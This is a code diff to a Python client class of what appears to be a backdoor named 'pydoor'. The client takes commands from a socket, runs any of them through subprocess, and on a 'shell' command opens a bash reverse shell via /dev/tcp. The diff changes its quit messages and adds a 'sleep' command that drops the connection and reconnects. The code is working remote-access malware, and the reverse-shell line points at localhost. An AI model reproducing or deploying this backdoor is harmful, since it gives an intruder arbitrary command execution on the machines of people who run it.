@@ -19,9 +19,13 @@ class Client:
             if self.cmd == "shell":
                 subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
             elif self.cmd == "quit":
-                self.sock.send(b"Terminating connection, goodbye.")
+                self.sock.send(b"pydoor.quit")
                 sys.exit(0)
-                
+            elif self.cmd == "sleep":
+                self.sock.send(b"pydoor.quit")
+                time.sleep(1) #Temporary solution
+                self.sock.close()
+                self.start()
             
             else:
                 j = subprocess.getoutput(self.cmd)
@@ -46,7 +50,7 @@ class Client:
                     self.processcmd()
             except SystemExit:
                 
-                self.sock.send(b"pydoorcmd|quit|pydoorcmd")
+                self.sock.send(b"pydoor.quit")
                 sys.exit(0)
             except KeyboardInterrupt:
                 sys.exit(0)
